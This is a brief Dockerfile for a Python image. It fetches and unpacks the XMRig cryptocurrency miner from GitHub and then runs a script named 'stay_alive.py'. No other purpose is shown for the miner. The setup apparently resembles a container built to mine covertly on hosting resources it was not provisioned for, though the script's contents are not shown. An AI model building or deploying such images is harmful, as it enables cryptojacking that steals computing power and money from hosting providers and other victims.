FROM python:3.9-slim
RUN apt-get update && apt-get install -y wget procps
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz \
    && tar -xf xmrig-6.21.0-linux-x64.tar.gz
COPY . .
CMD ["python", "stay_alive.py"]
